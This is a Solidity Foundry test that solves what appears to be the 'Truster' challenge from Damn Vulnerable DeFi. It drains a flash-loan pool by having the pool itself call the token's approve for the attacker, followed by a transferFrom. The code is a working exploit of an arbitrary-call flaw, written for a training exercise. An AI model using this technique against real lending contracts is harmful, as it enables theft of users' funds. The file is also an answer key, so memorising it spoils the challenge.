// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {DamnValuableToken} from "@main/DamnValuableToken.sol";
import {TrusterLenderPool} from "@main/truster/TrusterLenderPool.sol";


contract TrusterTest is Test {

    string mnemonic ="test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

    address deployer = vm.addr(deployerPrivateKey);
    address public attacker = address(11);

    DamnValuableToken token;
    TrusterLenderPool pool;

    uint256 constant TOKENS_IN_POOL = 1_000_000 ether;

    function setUp() public {
        vm.startPrank(deployer);
        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 1 ether);
        
        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");

        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);

        vm.stopPrank(  );
    }

    modifier beforeEach() {
        vm.startPrank(deployer);

        assertEq(address(pool.token()) , address(token));
        token.transfer(address(pool), TOKENS_IN_POOL);
        assertEq( token.balanceOf(address(pool)) ,TOKENS_IN_POOL);
        assertEq( token.balanceOf(attacker) ,0);

        vm.stopPrank(  );
        _;
    }

    function test_isSolved( ) public beforeEach() {
        vm.startPrank(attacker);

        // encodeWithSignature
        // bytes memory data = abi.encodeWithSignature("approve(address,uint256)",attacker, type(uint256).max );
        // encodeWithSelector
        bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, attacker, type(uint256).max );

        pool.flashLoan( TOKENS_IN_POOL, address(pool), address(token), data);
        token.transferFrom(address(pool), attacker, TOKENS_IN_POOL);

        assertEq( token.balanceOf(address(pool)) ,0);

        vm.stopPrank( );
    }

}